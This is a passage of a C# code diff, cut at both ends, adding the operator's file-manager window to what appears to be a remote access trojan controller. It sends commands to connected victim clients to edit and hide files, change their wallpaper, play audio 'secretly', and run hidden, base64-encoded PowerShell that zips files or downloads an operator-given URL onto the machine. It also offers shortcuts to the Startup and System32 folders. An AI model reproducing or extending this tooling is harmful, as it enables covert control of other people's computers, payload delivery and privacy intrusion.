+            ServerWindow.LogGlobal($"[FM] Hash computation timed out for '{path}' on client {_clientId}.");
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Hash failed", row.Name, "failed");
+            ServerWindow.LogGlobal($"[FM] Hash computation failed for '{path}' on client {_clientId}: {ex.Message}");
+        }
+        finally { _pendingHash = null; }
+    }
+
+    private static readonly HashSet<string> _binaryExtensions = new(StringComparer.OrdinalIgnoreCase)
+        { ".exe",".dll",".sys",".bin",".dat",".zip",".7z",".rar",".tar",".gz",".bz2",
+          ".png",".jpg",".jpeg",".gif",".bmp",".ico",".tiff",".webp",".mp3",".mp4",
+          ".avi",".mkv",".wav",".flac",".ogg",".pdf",".docx",".xlsx",".pptx",".db",
+          ".sqlite",".lnk",".msi",".cab",".iso",".img" };
+
+    private static readonly HashSet<string> _previewImageExts = new(StringComparer.OrdinalIgnoreCase)
+        { ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico" };
+    private static readonly HashSet<string> _previewVideoExts = new(StringComparer.OrdinalIgnoreCase)
+        { ".mp4", ".avi", ".mov", ".wmv", ".m4v" };
+    private static readonly HashSet<string> _previewTextExts  = new(StringComparer.OrdinalIgnoreCase)
+        { ".txt", ".log", ".ini", ".cfg", ".json", ".xml", ".csv", ".bat", ".ps1", ".py", ".cs", ".md", ".html", ".css" };
+
+    private async void Edit_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
+        if (_pendingData != null) return;
+        if (_binaryExtensions.Contains(Path.GetExtension(row.Name)))
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), "Binary files cannot be edited as text.");
+            return;
+        }
+        if (row.SizeRaw > 2 * 1024 * 1024)
+        {
+            TxtStatus.Text = Lang.Get("FM_EDITOR_TOO_LARGE");
+            return;
+        }
+        var path = Path.Combine(_currentPath, row.Name);
+        TxtStatus.Text = Lang.Get("FM_EDITOR_LOADING");
+        ServerWindow.ReportGlobalActivity("Edit file", row.Name, "running");
+
+        _pendingPreview?.TrySetCanceled();
+        _pendingPreview = null;
+        _previewSerial++;
+        var tcs = new TaskCompletionSource<string>();
+        _pendingPreview = tcs;
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmDownload,
+                Data = JsonConvert.SerializeObject(new FmDownloadData { Path = path })
+            });
+            var json = await tcs.Task.WaitAsync(TimeSpan.FromSeconds(60));
+            var result = JsonConvert.DeserializeObject<FmFileDataResult>(json);
+            if (result == null || !string.IsNullOrEmpty(result.Error))
+            {
+                TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), result?.Error ?? "No data");
+                ServerWindow.ReportGlobalActivity("Edit file failed", row.Name, "failed");
+                return;
+            }
+            var bytes = await Task.Run(() => Convert.FromBase64String(result.Data));
+            if (bytes.Length > 2 * 1024 * 1024)
+            {
+                TxtStatus.Text = Lang.Get("FM_EDITOR_TOO_LARGE");
+                ServerWindow.ReportGlobalActivity("Edit file failed", row.Name, "failed");
+                return;
+            }
+            var text = System.Text.Encoding.UTF8.GetString(bytes);
+            TxtStatus.Text = row.Name;
+
+            var saveCallback = new Func<string, Task<bool>>(async newText =>
+            {
+                if (_pendingAck != null) return false;
+                _pendingAck = new TaskCompletionSource<string>(); // claim slot before any await so guard stays effective
+                try
+                {
+                    var encoded = await Task.Run(() => Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(newText)));
+                    await _server.SendToClient(_clientId, new Packet
+                    {
+                        Type = PacketType.FmUpload,
+                        Data = JsonConvert.SerializeObject(new FmUploadData { Path = path, Data = encoded })
+                    });
+                    var ackJson = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(30));
+                    var ack = JsonConvert.DeserializeObject<FmAckData>(ackJson);
+                    return ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error));
+                }
+                catch { return false; }
+                finally { _pendingAck = null; }
+            });
+
+            var editor = new FileEditorWindow(row.Name, path, text, saveCallback);
+            editor.Owner = this;
+            editor.Show();
+        }
+        catch (OperationCanceledException)
+        {
+            TxtStatus.Text = "";
+            ServerWindow.ReportGlobalActivity("Edit file failed", row.Name, "failed");
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Edit file failed", row.Name, "failed");
+        }
+        finally
+        {
+            if (_pendingPreview == tcs) _pendingPreview = null;
+        }
+    }
+
+    private async void ShowHide_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row) return;
+        var path = Path.Combine(_currentPath, row.Name);
+        var targetAction = row.IsHidden ? "Show file" : "Hide file";
+
+        ServerWindow.ReportGlobalActivity(targetAction, row.Name, "running");
+        ServerWindow.LogGlobal($"[FM] Setting hidden attribute to {!row.IsHidden} for '{path}' on client {_clientId}...");
+
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmShowHide,
+                Data = JsonConvert.SerializeObject(new FmShowHideData { Path = path, Hide = !row.IsHidden })
+            });
+            ServerWindow.ReportGlobalActivity(targetAction, row.Name, "complete");
+            await Navigate(_currentPath);
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity(targetAction, row.Name, "failed");
+        }
+    }
+
+    private async void SetAttr_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
+        if (_pendingAck != null || _pendingHash != null) return;
+        var path = Path.Combine(_currentPath, row.Name);
+        var current = (System.IO.FileAttributes)row.AttributesRaw;
+        var newAttrs = ShowAttrDialog(row.Name, current);
+        if (newAttrs == null) return;
+        
+        TxtStatus.Text = string.Format(Lang.Get("FM_SETTING_ATTR"), row.Name);
+        ServerWindow.ReportGlobalActivity("Set attributes", row.Name, "running");
+        ServerWindow.LogGlobal($"[FM] Setting attributes for '{path}' to {newAttrs.Value} on client {_clientId}...");
+        
+        _pendingAck = new TaskCompletionSource<string>();
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmSetAttr,
+                Data = JsonConvert.SerializeObject(new FmSetAttrData { Path = path, Attributes = (int)newAttrs.Value })
+            });
+            var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(10));
+            var ack = JsonConvert.DeserializeObject<FmAckData>(json);
+            if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
+            {
+                TxtStatus.Text = string.Format(Lang.Get("FM_ATTR_SET"), row.Name);
+                ServerWindow.ReportGlobalActivity("Set attributes", row.Name, "success");
+                ServerWindow.LogGlobal($"[FM] Attributes set successfully for '{path}' on client {_clientId}.");
+            }
+            else
+            {
+                var err = ack?.Error ?? "Unknown error";
+                TxtStatus.Text = string.Format(Lang.Get("FM_ATTR_FAILED"), err);
+                ServerWindow.ReportGlobalActivity("Set attributes", row.Name, "failed");
+                ServerWindow.LogGlobal($"[FM] Set attributes failed for '{path}' on client {_clientId}: {err}");
+            }
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("FM_ATTR_FAILED"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Set attributes", row.Name, "failed");
+            ServerWindow.LogGlobal($"[FM] Set attributes failed/timed out for '{path}' on client {_clientId}: {ex.Message}");
+        }
+        finally { _pendingAck = null; }
+        await Navigate(_currentPath);
+    }
+
+    private static System.IO.FileAttributes? ShowAttrDialog(string fileName, System.IO.FileAttributes current)
+    {
+        var dlg = new Window
+        {
+            Title = Lang.Get("FM_SET_ATTRS"), Width = 280, Height = 200,
+            WindowStartupLocation = WindowStartupLocation.CenterScreen,
+            ResizeMode = ResizeMode.NoResize,
+            Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
+                      ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24))
+        };
+        var textBrush = Application.Current.TryFindResource("ContentTextBrush") as System.Windows.Media.Brush
+                     ?? System.Windows.Media.Brushes.White;
+        var dimBrush  = Application.Current.TryFindResource("FieldLabelBrush") as System.Windows.Media.Brush
+                     ?? System.Windows.Media.Brushes.Gray;
+        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
+        sp.Children.Add(new System.Windows.Controls.TextBlock
+        {
+            Text = fileName, Foreground = dimBrush,
+            FontSize = 10, Margin = new Thickness(0, 0, 0, 10),
+            TextTrimming = System.Windows.TextTrimming.CharacterEllipsis
+        });
+        System.IO.FileAttributes[] flags = [
+            System.IO.FileAttributes.ReadOnly,
+            System.IO.FileAttributes.Hidden,
+            System.IO.FileAttributes.System,
+            System.IO.FileAttributes.Archive,
+        ];
+        var boxes = new List<System.Windows.Controls.CheckBox>();
+        foreach (var f in flags)
+        {
+            var cb = new System.Windows.Controls.CheckBox
+            {
+                Content = f.ToString(),
+                IsChecked = current.HasFlag(f),
+                Foreground = textBrush,
+                Margin = new Thickness(0, 2, 0, 2),
+            };
+            sp.Children.Add(cb);
+            boxes.Add(cb);
+        }
+        var ok = new System.Windows.Controls.Button
+        {
+            Content = Lang.Get("DLG_APPLY"), Width = 70, HorizontalAlignment = HorizontalAlignment.Right,
+            Margin = new Thickness(0, 10, 0, 0), Padding = new Thickness(10, 4, 10, 4)
+        };
+        ok.Click += (_, _) => { dlg.DialogResult = true; };
+        sp.Children.Add(ok);
+        dlg.Content = sp;
+        if (dlg.ShowDialog() != true) return null;
+        System.IO.FileAttributes result = 0;
+        for (int i = 0; i < flags.Length; i++)
+            if (boxes[i].IsChecked == true) result |= flags[i];
+        return result;
+    }
+
+    private async void Wallpaper_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
+        var path = Path.Combine(_currentPath, row.Name);
+
+        ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "running");
+        ServerWindow.LogGlobal($"[FM] Setting wallpaper to '{path}' on client {_clientId}...");
+
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FunCmd,
+                Data = JsonConvert.SerializeObject(new FunCmdData { Action = "set_wallpaper", Param = path })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_WALLPAPER_SET"), row.Name);
+            ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "complete");
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "failed");
+        }
+    }
+
+    private async void PlayMusicSecret_Click(object s, RoutedEventArgs e)
+    {
+        if (_isPlayingAudio)
+        {
+            try
+            {
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmPlayAudioStop });
+                _isPlayingAudio = false;
+                MnuFmPlayMusicSecret.Header = Lang.Get("FM_PLAY_MUSIC_SECRET");
+                TxtStatus.Text = Lang.Get("FM_AUDIO_STOPPED");
+            }
+            catch (Exception ex)
+            {
+                _isPlayingAudio = false;
+                MnuFmPlayMusicSecret.Header = Lang.Get("FM_PLAY_MUSIC_SECRET");
+                TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            }
+            return;
+        }
+
+        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
+        var path = Path.Combine(_currentPath, row.Name);
+
+        ServerWindow.ReportGlobalActivity("Play audio secretly", row.Name, "running");
+        ServerWindow.LogGlobal($"[FM] Playing audio secretly '{path}' on client {_clientId}...");
+
+        _isPlayingAudio = true;
+        MnuFmPlayMusicSecret.Header = Lang.Get("FM_STOP_AUDIO");
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmPlayAudio,
+                Data = JsonConvert.SerializeObject(new FmPlayAudioData { Path = path })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_PLAYING_SILENT"), row.Name);
+            ServerWindow.ReportGlobalActivity("Play audio secretly", row.Name, "complete");
+        }
+        catch (Exception ex)
+        {
+            _isPlayingAudio = false;
+            MnuFmPlayMusicSecret.Header = Lang.Get("FM_PLAY_MUSIC_SECRET");
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Play audio secretly", row.Name, "failed");
+        }
+    }
+
+    private async void Zip_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row) return;
+        if (string.IsNullOrEmpty(_currentPath)) { TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), "Navigate to a folder first"); return; }
+        var path = Path.Combine(_currentPath, row.Name);
+        var dest = path + ".zip";
+
+        ServerWindow.ReportGlobalActivity("Zip item", row.Name, "running");
+        ServerWindow.LogGlobal($"[FM] Zipping '{path}' to '{dest}' on client {_clientId}...");
+
+        // Use PS encoded command — paths quoted in SET to handle & in names/paths.
+        // Double-quote any embedded " so CMD SET doesn't break on filenames like foo"bar.
+        var safeSrc = path.Replace("\"", "\"\"");
+        var safeDst = dest.Replace("\"", "\"\"");
+        var ps  = "Compress-Archive -Path $env:SERO_SRC -DestinationPath $env:SERO_DST -Force";
+        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.AutoTaskShell,
+                Data = $"SET \"SERO_SRC={safeSrc}\"&& SET \"SERO_DST={safeDst}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_ZIPPING"), row.Name);
+            await Task.Delay(8000);
+            ServerWindow.ReportGlobalActivity("Zip item", row.Name, "complete");
+            ServerWindow.LogGlobal($"[FM] Zip command executed for '{path}' on client {_clientId}.");
+            await Navigate(_currentPath);
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Zip item", row.Name, "failed");
+        }
+    }
+
+    private async void DownloadUrl_Click(object s, RoutedEventArgs e)
+    {
+        if (string.IsNullOrEmpty(_currentPath))
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), "Navigate to a folder first");
+            return;
+        }
+
+        var url = PromptInput(Lang.Get("FM_URL_PROMPT"), "https://");
+        if (string.IsNullOrWhiteSpace(url)) return;
+
+        // Validate URL before sending
+        if (!Uri.TryCreate(url, UriKind.Absolute, out var parsedUri) ||
+            (parsedUri.Scheme != "http" && parsedUri.Scheme != "https"))
+        {
+            TxtStatus.Text = Lang.Get("FM_INVALID_URL");
+            return;
+        }
+
+        var filename = Path.GetFileName(parsedUri.LocalPath);
+        if (string.IsNullOrWhiteSpace(filename)) filename = "download";
+        var dest = Path.Combine(_currentPath, filename);
+
+        ServerWindow.ReportGlobalActivity("Download URL", filename, "running");
+        ServerWindow.LogGlobal($"[FM] Requesting URL download '{url}' to '{dest}' on client {_clientId}...");
+
+        // Use PS encoded command — values quoted in SET so & in URLs/paths is treated literally.
+        // Double-quote any embedded " to prevent CMD SET from breaking the quoting context.
+        var safeUrl  = url.Replace("\"", "\"\"");
+        var safeDest = dest.Replace("\"", "\"\"");
+        var ps  = "Invoke-WebRequest -Uri $env:SERO_URL -OutFile $env:SERO_OUT -UseBasicParsing";
+        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.AutoTaskShell,
+                Data = $"SET \"SERO_URL={safeUrl}\"&& SET \"SERO_OUT={safeDest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), filename);
+            await Task.Delay(8000);
+            ServerWindow.ReportGlobalActivity("Download URL", filename, "complete");
+            ServerWindow.LogGlobal($"[FM] Download URL command executed for '{url}' on client {_clientId}.");
+            await Navigate(_currentPath);
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Download URL", filename, "failed");
+        }
+    }
+
+    // ── Navigation buttons ──────────────────────────
+
+    private async void Back_Click(object s, RoutedEventArgs e)
+    {
+        if (_history.TryPop(out var prev))
+        {
+            var saved = _currentPath;
+            _currentPath = "";           // cleared so Navigate won't re-push it
+            await Navigate(prev);
+            if (string.IsNullOrEmpty(_currentPath)) _currentPath = saved; // restore on timeout/error
+        }
+        else
+        {
+            var parent = Path.GetDirectoryName(_currentPath);
+            await Navigate(parent ?? "");
+        }
+    }
+
+    private async void Refresh_Click(object s, RoutedEventArgs e) => await Navigate(_currentPath);
+    private async void GoPath_Click(object s, RoutedEventArgs e) => await Navigate(TxtPath.Text.Trim());
+    private async void TxtPath_KeyDown(object s, KeyEventArgs e) { if (e.Key == Key.Return) await Navigate(TxtPath.Text.Trim()); }
+
+    private async void GoToDesktop_Click(object s, RoutedEventArgs e) => await Navigate("%USERPROFILE%\\Desktop");
+    private async void GoToUser_Click(object s, RoutedEventArgs e)    => await Navigate("%USERPROFILE%");
+    private async void GoToTemp_Click(object s, RoutedEventArgs e)    => await Navigate("%TEMP%");
+    private async void GoToAppData_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%");
+    private async void GoToStartup_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+    private async void GoToWindows_Click(object s, RoutedEventArgs e)  => await Navigate("%SystemRoot%");
+    private async void GoToSystem32_Click(object s, RoutedEventArgs e) => await Navigate("%SystemRoot%\\System32");
+
+    private async void DrivesList_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
+    {
+        if (DrivesList.SelectedItem is DriveItemVM driveItem)
+        {
+            DrivesList.SelectedItem = null;
+            await Navigate(driveItem.Path);
+        }
+    }
+
+    private async void GridFiles_DoubleClick(object s, MouseButtonEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row || !row.IsDir) return;
+        var path = string.IsNullOrEmpty(_currentPath)
+            ? row.Name
+            : Path.Combine(_currentPath, row.Name);
+        await Navigate(path);
+    }
+
+    // ── Disconnect handling ──────────────────────────────────────────────────
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        _pendingList?.TrySetCanceled();
+        _pendingData?.TrySetCanceled();
+        _pendingPreview?.TrySetCanceled();
+        _pendingHash?.TrySetCanceled();
+        _pendingAck?.TrySetCanceled();
+    }
+
+    private void OnClientConnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (string.IsNullOrEmpty(_hwid) || c.Hwid != _hwid) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _server.UnregisterHandler(_clientId, PacketType.FmListResult);
+            _server.UnregisterHandler(_clientId, PacketType.FmFileData);
+            _server.UnregisterHandler(_clientId, PacketType.FmHashResult);
+            _server.UnregisterHandler(_clientId, PacketType.FmAck);
+            _clientId = c.Id;
+            _server.RegisterHandler(_clientId, PacketType.FmListResult, pkt => { _pendingList?.TrySetResult(pkt.Data); });
+            _server.RegisterHandler(_clientId, PacketType.FmFileData, pkt =>
+            {
+                var pd = _pendingData;
+                if (pd != null) pd.TrySetResult(pkt.Data);
+                else _pendingPreview?.TrySetResult(pkt.Data);
+            });
+            _server.RegisterHandler(_clientId, PacketType.FmHashResult, pkt => { _pendingHash?.TrySetResult(pkt.Data); });
+            _server.RegisterHandler(_clientId, PacketType.FmAck,        pkt => { _pendingAck?.TrySetResult(pkt.Data); });
+            _ = Navigate(_currentPath);
+        });
+    }
+
+    // ── Helpers ─────────────────────────────────────
+
+    private static bool ShowConfirmDialog(string message, string title)
+    {
+        var dlg = new Window
+        {
+            Title = title, Width = 380, Height = 150,
+            WindowStartupLocation = WindowStartupLocation.CenterScreen,
+            ResizeMode = ResizeMode.NoResize,
+            Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
+                      ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
+        };
+        var textBrush   = Application.Current.TryFindResource("ContentTextBrush") as System.Windows.Media.Brush
+                       ?? System.Windows.Media.Brushes.White;
+        var labelBrush  = Application.Current.TryFindResource("FieldLabelBrush")  as System.Windows.Media.Brush
+                       ?? System.Windows.Media.Brushes.Gray;
+        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(18, 16, 18, 12) };
+        sp.Children.Add(new System.Windows.Controls.TextBlock
+        {
+            Text = message, Foreground = textBrush, FontSize = 12,
+            TextWrapping = TextWrapping.Wrap, Margin = new Thickness(0, 0, 0, 14)
+        });
+        var row = new System.Windows.Controls.StackPanel
+        {
+            Orientation = System.Windows.Controls.Orientation.Horizontal,
+            HorizontalAlignment = HorizontalAlignment.Right
+        };
+        var btnYes = new System.Windows.Controls.Button
+        {
+            Content = Lang.Get("DLG_YES"), Width = 72,
+            Padding = new Thickness(10, 4, 10, 4), Margin = new Thickness(0, 0, 8, 0)
+        };
+        var btnNo = new System.Windows.Controls.Button
+        {
+            Content = Lang.Get("DLG_NO"), Width = 72,
+            Padding = new Thickness(10, 4, 10, 4)
+        };
+        bool result = false;
+        btnYes.Click += (_, _) => { result = true;  dlg.Close(); };
+        btnNo.Click  += (_, _) => { result = false; dlg.Close(); };
+        row.Children.Add(btnYes);
+        row.Children.Add(btnNo);
+        sp.Children.Add(row);
+        dlg.Content = sp;
+        dlg.ShowDialog();
+        return result;
+    }
+
+    private static void ShowInfoDialog(string message, string title)
+    {
+        var dlg = new Window
+        {
+            Title = title, Width = 420, Height = 160,
+            WindowStartupLocation = WindowStartupLocation.CenterScreen,
+            ResizeMode = ResizeMode.NoResize,
+            Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
+                      ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
+        };
+        var textBrush  = Application.Current.TryFindResource("ContentTextBrush") as System.Windows.Media.Brush
+                      ?? System.Windows.Media.Brushes.White;
+        var monoFamily = new System.Windows.Media.FontFamily("Consolas");
+        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(18, 16, 18, 12) };
+        sp.Children.Add(new System.Windows.Controls.TextBlock
+        {
+            Text = message, Foreground = textBrush, FontSize = 11,
+            FontFamily = monoFamily, TextWrapping = TextWrapping.Wrap,
+            Margin = new Thickness(0, 0, 0, 14)
+        });
+        var ok = new System.Windows.Controls.Button
+        {
+            Content = Lang.Get("DLG_OK"), Width = 72,
+            HorizontalAlignment = HorizontalAlignment.Right,
+            Padding = new Thickness(10, 4, 10, 4)
+        };
+        ok.Click += (_, _) => { dlg.DialogResult = true; };
+        sp.Children.Add(ok);
+        dlg.Content = sp;
+        dlg.ShowDialog();
+    }
+
+    private static string? PromptInput(string label, string defaultVal = "")
+    {
+        var dlg = new Window
+        {
+            Title = Lang.Get("DLG_INPUT_TITLE"), Width = 380, Height = 165,
+            WindowStartupLocation = WindowStartupLocation.CenterScreen,
+            ResizeMode = ResizeMode.NoResize,
+            Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
+                      ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
+        };
+        var pTextBrush   = Application.Current.TryFindResource("ContentTextBrush") as System.Windows.Media.Brush
+                        ?? System.Windows.Media.Brushes.White;
+        var pInputBg     = Application.Current.TryFindResource("InputBgBrush") as System.Windows.Media.Brush
+                        ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24));
+        var pBorderBrush = Application.Current.TryFindResource("InputBorderBrush") as System.Windows.Media.Brush
+                        ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(42, 48, 88));
+        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
+        sp.Children.Add(new System.Windows.Controls.TextBlock
+        {
+            Text = label, Foreground = pTextBrush,
+            FontSize = 12, Margin = new Thickness(0, 0, 0, 8)
+        });
+        var tb = new System.Windows.Controls.TextBox
+        {
+            Text = defaultVal,
+            Background  = pInputBg,
+            Foreground  = pTextBrush,
+            BorderBrush = pBorderBrush,
+            Padding = new Thickness(6, 4, 6, 4),
+            Margin = new Thickness(0, 0, 0, 8)
+        };
+        sp.Children.Add(tb);
+        var ok = new System.Windows.Controls.Button
+        {
+            Content = Lang.Get("DLG_OK"), Width = 60, HorizontalAlignment = HorizontalAlignment.Right,
+            Padding = new Thickness(10, 4, 10, 4)
+        };
+        ok.Click += (_, _) => { dlg.DialogResult = true; };
+        sp.Children.Add(ok);
+        dlg.Content = sp;
+        tb.SelectAll(); tb.Focus();
+        return dlg.ShowDialog() == true ? tb.Text : null;
+    }
+
+    // ── Preview pane ─────────────────────────────────────────────────────────
+
+    private string? _previewTempFile;
+    private bool _videoPlaying;
+    private bool _isPlayingAudio;
+
+    private void GridFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
+    {
+        int count = GridFiles.SelectedItems.Count;
+        if (count > 1)
+        {
+            TxtPreviewName.Text  = $"{count} items selected";
+            BtnPreview.IsEnabled = false;
+            _previewIsPlaceholder = true;
+            TxtPreviewInfo.Text  = Lang.Get("FM_SELECT_FILE");
+            ShowPreviewPanel("empty");
+            return;
+        }
+        if (GridFiles.SelectedItem is not FileEntryVM vm || vm.IsDir)
+        {
+            TxtPreviewName.Text  = "No file selected";
+            BtnPreview.IsEnabled = false;
+            _previewIsPlaceholder = true;
+            TxtPreviewInfo.Text  = Lang.Get("FM_SELECT_FILE");
+            ShowPreviewPanel("empty");
+            return;
+        }
+        TxtPreviewName.Text  = vm.Name;
+        BtnPreview.IsEnabled = true;
+        // Auto-preview only for single selection — never during rubber-band drag
+        // .webp excluded — WPF BitmapImage has no native WEBP decoder
+        // .mkv/.webm excluded — WMF has no built-in codec on stock Windows
+        var ext = Path.GetExtension(vm.Name).ToLowerInvariant();
+        if ((_previewImageExts.Contains(ext) && vm.SizeRaw <= 20L * 1024 * 1024)
+         || (_previewTextExts.Contains(ext)  && vm.SizeRaw <= 4L  * 1024 * 1024)
+         || (_previewVideoExts.Contains(ext) && vm.SizeRaw <  30L * 1024 * 1024))
+            BtnPreview_Click(null!, new RoutedEventArgs());
+    }
+
+    private async void BtnPreview_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM vm || vm.IsDir) return;
+        var path = _currentPath.TrimEnd('\\', '/') + "\\" + vm.Name;
+        var ext  = Path.GetExtension(vm.Name).ToLowerInvariant();
+
+        // Cancel any in-flight download before the gates — a gate that returns early would
+        // otherwise leave the serial unchanged, letting a stale response overwrite its message.
+        _pendingPreview?.TrySetCanceled();
+        _pendingPreview = null;
+        int mySerial = ++_previewSerial;
+
+        // Compute once here — ext is immutable; avoids re-evaluation after awaits below.
+        bool isVideo = _previewVideoExts.Contains(ext);
+        bool isImage = _previewImageExts.Contains(ext);
+        bool isText  = _previewTextExts.Contains(ext);
+
+        if (ext is ".mkv" or ".webm")
+        {
+            // WMF has no built-in codec for MKV/WebM on stock Windows — block before downloading
+            TxtPreviewInfo.Text = Lang.Get("FM_CODEC_ERROR");
+            ShowPreviewPanel("empty");
+            return;
+        }
+        if (isVideo && vm.SizeRaw >= 30L * 1024 * 1024)
+        {
+            TxtPreviewInfo.Text = $"Video too large for preview ({vm.SizeRaw / 1024 / 1024} MB). Max 30 MB.";
+            ShowPreviewPanel("empty");
+            return;
+        }
+        if (isImage && vm.SizeRaw > 20L * 1024 * 1024)
+        {
+            TxtPreviewInfo.Text = $"Image too large for preview ({vm.SizeRaw / 1024 / 1024} MB). Max 20 MB.";
+            ShowPreviewPanel("empty");
+            return;
+        }
+        if (isText && vm.SizeRaw > 4L * 1024 * 1024)
+        {
+            TxtPreviewInfo.Text = $"Text file too large for preview ({vm.SizeRaw / 1024 / 1024} MB). Max 4 MB.";
+            ShowPreviewPanel("empty");
+            return;
+        }
+
+        _videoPlaying = false;
+        TxtPreviewInfo.Text = Lang.Get("STATUS_LOADING");
+        ShowPreviewPanel("empty");
+        BtnPreview.IsEnabled = false;
+
+        var myTcs = new TaskCompletionSource<string>();
+        try
+        {
+            _pendingPreview = myTcs;
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmDownload,
+                Data = JsonConvert.SerializeObject(new FmDownloadData { Path = path })
+            });
+            var json   = await myTcs.Task.WaitAsync(isVideo ? TimeSpan.FromSeconds(120) : TimeSpan.FromSeconds(30));
+            // Discard stale response — a newer preview request already took over.
+            if (_previewSerial != mySerial) return;
+            // Offload JSON decode + Base64 decode + BitmapImage creation to background thread
+            var (result, bytes, bmp) = await Task.Run(() =>
+            {
+                var r = JsonConvert.DeserializeObject<FmFileDataResult>(json);
+                if (r == null || !string.IsNullOrEmpty(r.Error))
+                    return (r, (byte[]?)null, (System.Windows.Media.Imaging.BitmapImage?)null);
+                var b = Convert.FromBase64String(r.Data);
+                System.Windows.Media.Imaging.BitmapImage? img = null;
+                if (isImage && b.Length > 0)
+                {
+                    try
+                    {
+                        using var bmpMs = new System.IO.MemoryStream(b);
+                        var tmp = new System.Windows.Media.Imaging.BitmapImage();
+                        tmp.BeginInit();
+                        tmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
+                        tmp.StreamSource = bmpMs;
+                        tmp.EndInit();
